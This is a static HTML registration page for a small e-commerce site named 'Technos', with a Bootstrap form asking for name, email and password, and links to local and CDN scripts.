<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.XYZ/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/all.css">
    <title>E-Commerce || Register Page</title>
</head>
<body>
    <header class="header bg-body-tertiary">
        <div class="container">
            <nav class="navbar navbar-expand-sm">
                <a href="index.html" class="navbar-brand">Technos<span>.</span></a>
                
            </nav>
        </div> 
    </header>

    <section class="section-form">
        <form>
            <div class="row ">
                <div class="col">
                    <label for="fname" class="form-label fw-semibold">First Name:</label>
                    <input type="text" class="form-control" id="fname">
                </div>
                <div class="col">
                    <label for="lname" class="form-label fw-semibold">Last Name:</label>
                    <input type="text" class="form-control" id="lname">
                </div>
                <p class="text-muted">Already have an account. <a href="login.html">Login</a></p>
            </div>
            <div class="mb-3">
                <label for="email" class="form-label fw-semibold">Email:</label>
                <input type="email" class="form-control" id="email" name="email">
            </div>
            <div class="mb-3">
                <label for="pwd" class="form-label fw-semibold">Password:</label>
                <input type="password" class="form-control" id="pwd"name="pswd">
            </div>
            <button type="submit" class="btn btn-primary" id="submit">Submit</button>
            
        </form>

    </section>
    
    <!-- <script src="js/script.js"></script> -->
    <script src="js/register.js"></script>
    <script src="https://cdn.jsdelivr.XYZ/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>
